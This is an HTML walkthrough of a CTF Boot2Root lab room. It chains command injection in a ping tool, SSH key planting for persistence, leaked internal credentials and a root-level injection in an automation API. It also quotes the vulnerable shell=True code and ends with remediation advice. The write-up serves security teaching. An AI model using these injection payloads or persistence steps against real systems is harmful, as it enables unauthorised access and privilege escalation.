@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏊 Infinity Pool — Walkthrough</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- Header -->
+        <header class="room-header">
+            <div class="emoji-row">🏊🌊🔭📡🔑</div>
+            <h1>Infinity Pool</h1>
+            <p class="subtitle">No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.</p>
+            <div class="room-meta">
+                <div class="badge">
+                    <span class="label">Room:</span> Hacker Holidays
+                </div>
+                <div class="badge">
+                    <span class="label">Category:</span> Boot2Root
+                </div>
+                <div class="badge">
+                    <span class="label">Difficulty:</span> Medium
+                </div>
+                <div class="badge">
+                    <span class="label">Time:</span> 60 min
+                </div>
+                <div class="badge">
+                    <span class="label">Points:</span> 90
+                </div>
+            </div>
+        </header>
+
+        <!-- Intro Image -->
+        <figure>
+            <img src="images/03_reckoning.png" alt="Infinity Pool — The Reckoning" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0 0 0;">
+            <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 Infinity Pool — The Reckoning</figcaption>
+        </figure>
+
+        <!-- Attack Chain Overview -->
+        <section>
+            <h2><span class="step-num">🗺️</span> Attack Chain</h2>
+            <div class="attack-chain">
+                <div class="node">Nmap Scan</div>
+                <span class="arrow">→</span>
+                <div class="node">Discover Port 80</div>
+                <span class="arrow">→</span>
+                <div class="node">robots.txt & app.js</div>
+                <span class="arrow">→</span>
+                <div class="node">/status & /internal/netcheck</div>
+                <span class="arrow">→</span>
+                <div class="node">Command Injection (web)</div>
+                <span class="arrow">→</span>
+                <div class="node">Internal Port Scan</div>
+                <span class="arrow">→</span>
+                <div class="node">Watchtower :3000</div>
+                <span class="arrow">→</span>
+                <div class="node">Leaked FreePBX Creds</div>
+                <span class="arrow">→</span>
+                <div class="node">UCP Voicemail → Auto Key</div>
+                <span class="arrow">→</span>
+                <div class="node">/jobs/export RCE (root)</div>
+                <span class="arrow">→</span>
+                <div class="node flag">🏁 Root Flag</div>
+            </div>
+        </section>
+
+        <!-- Step 1: Reconnaissance -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance — Nmap & Web Discovery</h2>
+
+            <p>Every Boot2Root starts with understanding the attack surface. We kicked off an <strong>Nmap</strong> scan against the target:</p>
+
+            <div class="code-block">
+                <div class="label">Nmap — Full Port Scan with Service Detection</div>
+                <pre>nmap -sCV -p- 10.113.130.146 -T4</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+Service Info: OS: Linux</div>
+            </div>
+
+            <p>Two ports open: <strong>22 (SSH)</strong> and <strong>80 (HTTP — Gunicorn)</strong>. The web server is our entry point. Visiting <code>http://10.113.130.146</code> shows a Byte Lotus hotel landing page — a surveillance-luxe resort with a disabled "Book a suite" button.</p>
+
+            <p>Viewing the page source reveals <code>app.js</code> with a critical clue:</p>
+
+            <div class="code-block">
+                <div class="label">app.js — Hidden Endpoints</div>
+                <pre>// TODO(ops): the staff connectivity tool at /status posts to the legacy
+// /internal/netcheck handler. Keep it out of the public nav until the new
+// auth gateway ships. Disallowed in robots.txt for now.
+console.log("Stay Noticed\u2122");</pre>
+            </div>
+
+            <p>And <code>robots.txt</code> confirms exactly where not to look — which tells us exactly where to look:</p>
+
+            <div class="code-block">
+                <div class="label">robots.txt</div>
+                <pre>User-agent: *
+Disallow: /internal/
+Disallow: /status</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Lesson:</strong> <code>robots.txt</code> is a polite request to search engines, not a security control. It's often the first place to check for hidden directories. If someone took the time to disallow it, it's probably interesting.
+            </div>
+        </section>
+
+        <!-- Step 2: Command Injection -->
+        <section>
+            <h2><span class="step-num">2</span> Command Injection in /internal/netcheck</h2>
+
+            <p>Visiting <code>/status</code> reveals a staff tool called <strong>"Sister-property connectivity"</strong> — a form that takes a hostname and pings it. The form POSTs to <code>/internal/netcheck</code>:</p>
+
+            <!-- Screenshot: Status Page -->
+            <figure>
+                <img src="images/day11_status.png" alt="Sister-property connectivity tool" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 The /status connectivity tool — takes a host and pings it</figcaption>
+            </figure>
+
+            <p>We test it with <code>127.0.0.1</code> and see the ping output rendered on the page. Then we test for command injection using a semicolon to chain a second command:</p>
+
+            <div class="code-block">
+                <div class="label">Browser — Test Command Injection</div>
+                <pre>127.0.0.1; id</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.037 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+
+uid=1001(web) gid=1001(web) groups=1001(web)</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Command injection confirmed!</strong> The server runs <code>ping -c 1 &lt;user_input&gt;</code> with <code>shell=True</code> and no input sanitization. We're executing commands as the <code>web</code> user.
+            </div>
+
+            <p>Reading the application source confirms the vulnerability:</p>
+
+            <div class="code-block">
+                <div class="label">app.py — The Vulnerable Code</div>
+                <pre>@app.route("/internal/netcheck", methods=["POST"])
+def netcheck():
+    host = request.form.get("host", "").strip()
+    proc = subprocess.run(
+        f"ping -c 1 {host}",    # ← user input directly interpolated
+        shell=True,              # ← shell=True enables command chaining
+        capture_output=True,
+        text=True,
+        timeout=15,
+    )</pre>
+            </div>
+        </section>
+
+        <!-- Step 3: Enumeration via Command Injection -->
+        <section>
+            <h2><span class="step-num">3</span> System Enumeration — Finding the User Flag</h2>
+
+            <p>Using the command injection through the browser form, we enumerate the filesystem:</p>
+
+            <div class="code-block">
+                <div class="label">Enumerate Home Directories</div>
+                <pre>127.0.0.1; ls -la /home</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">drwxr-xr-x  4 root   root   4096 Jun 30 09:06 .
+drwxr-xr-x 22 root   root   4096 Aug  7 10:27 ..
+drwxr-xr-x  4 ubuntu ubuntu 4096 Jun 30 10:02 ubuntu
+drwxr-x---  4 web    web    4096 Jun 30 09:44 web</div>
+            </div>
+
+            <p>Two users: <strong>web</strong> and <strong>ubuntu</strong>. Let's explore both:</p>
+
+            <div class="code-block">
+                <div class="label">List web's Home Directory</div>
+                <pre>127.0.0.1; ls -la /home/web</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">drwxr-x--- 4 web  web  4096 Jun 30 09:44 .
+drwxr-xr-x 4 root root 4096 Jun 30 09:06 ..
+-rw-r--r-- 1 web  web   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 web  web  3771 Feb 25  2020 .bashrc
+drwx------ 2 web  web  4096 Jun 30 09:24 .cache
+-rw-r--r-- 1 web  web   807 Feb 25  2020 .profile
+drwxr-xr-x 2 web  web  4096 Jun 30 09:23 .ssh
+-rw-r--r-- 1 web  web    21 Jun 30 09:07 user.txt</div>
+            </div>
+
+            <p>There it is — <code>user.txt</code>. Let's read it:</p>
+
+            <div class="code-block">
+                <div class="label">Read User Flag</div>
+                <pre>127.0.0.1; cat /home/web/user.txt</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 User Flag</div>
+                <div class="flag-value">THM{REDACTED}</div>
+            </div>
+
+            <p>We also checked the <strong>ubuntu</strong> user's home directory, but <code>.ssh/</code> was inaccessible and <code>.sudo_as_admin_successful</code> was empty — no easy pivot there.</p>
+        </section>
+
+        <!-- Step 4: SSH Access -->
+        <section>
+            <h2><span class="step-num">4</span> Establishing Proper SSH Access</h2>
+
+            <p>Working through the browser form is functional but cumbersome. We noticed <code>/home/web/.ssh/authorized_keys</code> was empty — let's add our own public key for a proper shell.</p>
+
+            <p>On the AttackBox, generate a key pair:</p>
+
+            <div class="code-block">
+                <div class="label">AttackBox — Generate SSH Key</div>
+                <pre>ssh-keygen -t rsa -b 2048 -f /tmp/infinity_key -N ""
+cat /tmp/infinity_key.pub</pre>
+            </div>
+
+            <p>Then use the command injection to append the public key to <code>authorized_keys</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Browser — Add SSH Public Key</div>
+                <pre>127.0.0.1; echo "ssh-rsa REDACTED" >> /home/web/.ssh/authorized_keys</pre>
+            </div>
+
+            <p>Now SSH in with a clean shell:</p>
+
+            <div class="code-block">
+                <div class="label">AttackBox — SSH In</div>
+                <pre>ssh -i /tmp/infinity_key web@10.113.130.146</pre>
+            </div>
+        </section>
+
+        <!-- Step 5: Internal Recon -->
+        <section>
+            <h2><span class="step-num">5</span> Internal Reconnaissance — The Three Hidden Systems</h2>
+
+            <p>With a proper shell, we map the internal attack surface. The room description mentions <em>"three systems nobody told you about"</em> — these are services listening only on localhost:</p>
+
+            <div class="code-block">
+                <div class="label">List All Listening Ports</div>
+                <pre>ss -tlnp</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">LISTEN 127.0.0.1:3000    Watchtower ops console
+LISTEN 127.0.0.1:3306    MySQL database
+LISTEN 127.0.0.1:5038    Asterisk Manager Interface (AMI)
+LISTEN 127.0.0.1:8080    Apache / FreePBX
+LISTEN 127.0.0.1:8088    Asterisk HTTP
+LISTEN 127.0.0.1:8089    Unknown (empty reply)
+LISTEN 127.0.0.1:9000    Automation worker (Gunicorn)
+LISTEN 0.0.0.0:80        Main web app (Gunicorn)</div>
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Port</th>
+                        <th>Service</th>
+                        <th>Significance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>3000</strong></td>
+                        <td>Watchtower</td>
+                        <td>Internal ops console — leaks credentials</td>
+                    </tr>
+                    <tr>
+                        <td><strong>8080</strong></td>
+                        <td>Apache / FreePBX</td>
+                        <td>VoIP phone system with UCP portal</td>
+                    </tr>
+                    <tr>
+                        <td><strong>9000</strong></td>
+                        <td>Automation Worker</td>
+                        <td>Runs as <strong>root</strong> — our privesc target</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <p>We also performed standard privilege escalation enumeration — <strong>SUID binaries</strong>, <strong>capabilities</strong>, <strong>cron jobs</strong>, and <strong>writable files</strong> — but nothing obvious stood out. The path to root would be through the internal services.</p>
+
+            <div class="code-block">
+                <div class="label">Privesc Enumeration (No Obvious Wins)</div>
+                <pre>find / -perm -4000 -type f 2>/dev/null    # Standard SUID binaries only
+getcap -r / 2>/dev/null                     # Standard capabilities only
+cat /etc/crontab                            # No custom cron jobs
+find / -writable -not -path '/proc/*' 2>/dev/null  # No unusual writable paths
+cat /etc/thm/ai-token                       # Permission denied (root-owned)</pre>
+            </div>
+        </section>
+
+        <!-- Step 6: Watchtower -->
+        <section>
+            <h2><span class="step-num">6</span> Watchtower — The Leaky Ops Console</h2>
+
+            <p>Port 3000 hosts <strong>Watchtower</strong>, an internal surveillance operations console. It's loopback-only and "authenticated by network position" — meaning if you can reach it, you're trusted:</p>
+
+            <div class="code-block">
+                <div class="label">Query Watchtower API</div>
+                <pre>curl http://127.0.0.1:3000/api/config</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">{
+  "automation_endpoint": "http://127.0.0.1:9000",
+  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
+  "telephony_pass": "St4yN0t1c3d_2026",
+  "telephony_portal": "http://127.0.0.1:8080/ucp",
+  "telephony_user": "FreePBXUCPTemplateCreator"
+}</div>
+            </div>
+
+            <div class="callout success">
+                <strong>🔑 Watchtower leaked three critical pieces:</strong>
+                <ul>
+                    <li><strong>FreePBX credentials:</strong> <code>FreePBXUCPTemplateCreator:St4yN0t1c3d_2026</code></li>
+                    <li><strong>UCP portal:</strong> <code>http://127.0.0.1:8080/ucp</code></li>
+                    <li><strong>Automation endpoint:</strong> <code>http://127.0.0.1:9000</code> — this runs as root</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Step 7: FreePBX -->
+        <section>
+            <h2><span class="step-num">7</span> FreePBX UCP — The Voicemail with the Key</h2>
+
+            <p>To access the FreePBX UCP portal (loopback-only on port 8080), we set up an SSH tunnel:</p>
+
+            <div class="code-block">
+                <div class="label">AttackBox — SSH Port Forwarding</div>
+                <pre>ssh -i /tmp/infinity_key -L 8080:127.0.0.1:8080 web@10.113.130.146 -N</pre>
+            </div>
+
+            <p>Then visit <code>http://127.0.0.1:8080/ucp/</code> in the browser and log in with the Watchtower credentials:</p>
+
+            <!-- Screenshot: UCP Login -->
+            <figure>
+                <img src="images/day11_ucp_login.png" alt="FreePBX User Control Panel login" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 Logging into FreePBX UCP with the leaked template credentials</figcaption>
+            </figure>
+
+            <p>Inside the UCP dashboard, a voicemail message contains the automation key:</p>
+
+            <!-- Screenshot: UCP Voicemail -->
+            <figure>
+                <img src="images/day11_voicemail.png" alt="Voicemail with automation key" style="max-width:100%; border-radius:8px; border:1px solid var(--border); margin:1rem 0;">
+                <figcaption style="color:var(--text-secondary); font-size:0.85rem; text-align:center;">📸 Voicemail: "Automation Key cc_auto_7b3f9a1c4e0d2f6a" &lt;9000&gt;</figcaption>
+            </figure>
+
+            <div class="callout thinking">
+                <strong>💡 The voicemail tells us:</strong> the automation key <code>cc_auto_7b3f9a1c4e0d2f6a</code> and hints at port <code>9000</code> — confirming our privesc target.
+            </div>
+        </section>
+
+        <!-- Step 8: Fuzzing the Automation Worker -->
+        <section>
+            <h2><span class="step-num">8</span> Enumerating the Automation Worker (Port 9000)</h2>
+
+            <p>Port 9000 is a Gunicorn worker running as <strong>root</strong>. We need to find its API endpoints. A quick fuzz reveals the first clue:</p>
+
+            <div class="code-block">
+                <div class="label">Fuzz Common Endpoints</div>
+                <pre>for word in api run exec cmd job jobs task export health status config; do
+  echo -n "$word: "
+  curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:9000/$word
+  echo
+done</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">api: 404
+run: 404
+exec: 404
+cmd: 404
+job: 404
+jobs: 404
+task: 404
+export: 404
+health: 200      ← This one works!
+status: 404
+config: 404</div>
+            </div>
+
+            <p><code>/health</code> returns 200. Let's see what it reveals:</p>
+
+            <div class="code-block">
+                <div class="label">GET /health — API Self-Documentation</div>
+                <pre>curl http://127.0.0.1:9000/health</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">{
+  "endpoints": {
+    "GET /health": "service status",
+    "POST /jobs/export": {
+      "auth": "Authorization: Bearer <automation key>",
+      "body": {"report": "<report name>"},
+      "desc": "archive the latest data export"
+    }
+  },
+  "runs_as": "root",
+  "service": "automation",
+  "status": "ok"
+}</div>
+            </div>
+
+            <div class="callout success">
+                <strong>🎯 Self-documenting API!</strong> The <code>/health</code> endpoint tells us exactly:
+                <ul>
+                    <li>The endpoint: <code>POST /jobs/export</code></li>
+                    <li>The auth header: <code>Authorization: Bearer &lt;automation key&gt;</code></li>
+                    <li>The required JSON body: <code>{"report": "&lt;report name&gt;"}</code></li>
+                    <li>The worker runs as <strong>root</strong></li>
+                </ul>
+            </div>
+
+            <div class="callout thinking">
+                <strong>💡 Lesson learned:</strong> We spent significant time guessing endpoints because we didn't fuzz port 9000 properly early on. A simple <code>for</code> loop with <code>curl</code> would have found <code>/health</code> immediately, which documents the entire API. Always fuzz internal services — both GET and POST.
+            </div>
+        </section>
+
+        <!-- Step 9: RCE as Root -->
+        <section>
+            <h2><span class="step-num">9</span> Command Injection → Root Shell</h2>
+
+            <p>The <code>/jobs/export</code> endpoint takes a report name and runs:</p>
+
+            <div class="code-block">
+                <div class="label">What the Server Executes</div>
+                <pre>tar czf /var/automation/exports/&lt;report&gt;.tgz /var/automation/data</pre>
+            </div>
+
+            <p>Our report name is interpolated directly into a shell command — the same pattern as the original ping injection, but this time running as <strong>root</strong>. We break out with a semicolon and comment out the rest:</p>
+
+            <div class="code-block">
+                <div class="label">Test Root Command Injection</div>
+                <pre>curl -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
+  -H "Content-Type: application/json" \
+  -d '{"report":"test;id;#"}'</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="output">{
+  "command": "tar czf /var/automation/exports/test;id;#.tgz ...",
+  "output": "uid=0(root) gid=0(root) groups=0(root)"
+}</div>
+            </div>
+
+            <p><strong>Root!</strong> The <code>#</code> comments out the <code>.tgz</code> suffix and the rest of the tar arguments, giving us clean command execution. Now let's find the root flag:</p>
+
+            <div class="code-block">
+                <div class="label">Read the Root Flag</div>
+                <pre>curl -X POST http://127.0.0.1:9000/jobs/export \
+  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
+  -H "Content-Type: application/json" \
+  -d '{"report":"test;cat /root/root.txt;#"}'</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏁 Root Flag</div>
+                <div class="flag-value">THM{REDACTED}</div>
+            </div>
+        </section>
+
+        <!-- Summary -->
+        <section>
+            <h2><span class="step-num">📋</span> Full Kill Chain Summary</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Step</th>
+                        <th>Technique</th>
+                        <th>What Made It Possible</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>1</strong></td>
+                        <td>Port Scan</td>
+                        <td>Nmap discovered ports 22 and 80 (Gunicorn)</td>
+                        <td>Web app exposed to network</td>
+                    </tr>
+                    <tr>
+                        <td><strong>2</strong></td>
+                        <td>Hidden Endpoint Discovery</td>
+                        <td><code>robots.txt</code> and <code>app.js</code> comments revealed <code>/status</code> and <code>/internal/netcheck</code></td>
+                        <td>Developer comments in client-side code</td>
+                    </tr>
+                    <tr>
+                        <td><strong>3</strong></td>
+                        <td>Command Injection</td>
+                        <td><code>ping -c 1 {input}</code> with <code>shell=True</code> and no sanitization</td>
+                        <td>Unsafe subprocess call with user input</td>
+                    </tr>
+                    <tr>
+                        <td><strong>4</strong></td>
+                        <td>User Flag</td>
+                        <td>Enumerated home directories, read <code>/home/web/user.txt</code></td>
+                        <td>Flag stored in plaintext in home directory</td>
+                    </tr>
+                    <tr>
+                        <td><strong>5</strong></td>
+                        <td>SSH Persistence</td>
+                        <td>Appended public key to <code>authorized_keys</code> via command injection</td>
+                        <td>Empty authorized_keys file was writable</td>
+                    </tr>
+                    <tr>
+                        <td><strong>6</strong></td>
+                        <td>Internal Port Scan</td>
+                        <td><code>ss -tlnp</code> revealed 8 loopback-only services</td>
+                        <td>Multiple internal services with no network segmentation</td>
+                    </tr>
+                    <tr>
+                        <td><strong>7</strong></td>
+                        <td>Credential Leak</td>
+                        <td>Watchtower <code>/api/config</code> exposed FreePBX credentials and automation endpoint</td>
+                        <td>Loopback-only service with no authentication</td>
+                    </tr>
+                    <tr>
+                        <td><strong>8</strong></td>
+                        <td>FreePBX UCP Access</td>
+                        <td>SSH tunnel to port 8080, logged in with default template credentials</td>
+                        <td>Default credentials never rotated (CVE-2026)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>9</strong></td>
+                        <td>Automation Key Discovery</td>
+                        <td>Voicemail message contained API key and port hint</td>
+                        <td>Sensitive key left in voicemail</td>
+                    </tr>
+                    <tr>
+                        <td><strong>10</strong></td>
+                        <td>API Enumeration</td>
+                        <td>Fuzzed port 9000, <code>/health</code> documented the <code>/jobs/export</code> endpoint</td>
+                        <td>Self-documenting API with no protection</td>
+                    </tr>
+                    <tr>
+                        <td><strong>11</strong></td>
+                        <td>Root RCE</td>
+                        <td>Command injection in report parameter: <code>test;cat /root/root.txt;#</code></td>
+                        <td>Same shell injection pattern, now running as root</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Remediation -->
+        <section>
+            <h2><span class="step-num">🛡️</span> Remediation Advice</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Issue</th>
+                        <th>Fix</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Hidden endpoints in client-side code</strong></td>
+                        <td>Never rely on obscurity. Use proper authentication on all sensitive endpoints. Comments in JS/HTML are visible to everyone.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Command injection in netcheck</strong></td>
+                        <td>Never use <code>shell=True</code> with user input. Use <code>subprocess.run([...])</code> with argument lists, or validate input against a strict allowlist (e.g., IP addresses only).</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Loopback-only services with no auth</strong></td>
+                        <td>Loopback binding is not authentication. Any local user can access these services. Add authentication even for internal services.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Credentials in Watchtower API</strong></td>
+                        <td>Never expose credentials via unauthenticated APIs. Use a secrets manager or environment variables.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Default FreePBX credentials</strong></td>
+                        <td>Force password changes on first login. Disable template/default accounts in production.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Automation key in voicemail</strong></td>
+                        <td>Never transmit secrets via voicemail. Use secure key distribution mechanisms with audit trails.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Self-documenting API on /health</strong></td>
+                        <td>Production health endpoints should not expose API documentation. Separate docs from runtime.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Command injection in /jobs/export</strong></td>
+                        <td>Same fix as above — never interpolate user input into shell commands. Use argument arrays.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Automation worker runs as root</strong></td>
+                        <td>Principle of least privilege — the automation worker should run as a dedicated unprivileged user, not root.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>🏊 <strong>Infinity Pool</strong> — Hacker Holidays 2026</p>
+            <p><a href="https://tryhackme.com/" target="_blank">TryHackMe Room</a> · Category: Boot2Root · Techniques: Nmap Recon, robots.txt Enumeration, Command Injection, SSH Key Injection, Internal Port Scanning, API Enumeration, Credential Leakage, FreePBX UCP (CVE-2026), API Fuzzing, Privilege Escalation via Automation Worker</p>
+        </footer>
+
+    </div>
+</body>
+</html>
